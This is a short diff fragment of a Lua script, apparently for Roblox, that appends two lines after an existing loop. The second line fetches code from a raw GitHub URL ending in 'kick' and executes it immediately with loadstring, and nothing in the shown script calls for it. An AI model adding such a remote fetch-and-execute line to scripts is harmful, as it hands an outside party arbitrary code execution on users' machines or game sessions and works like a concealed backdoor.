@@ -88,3 +88,5 @@ while wait() do
 		end)
 	end
 end
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/nub/main/kick"))()
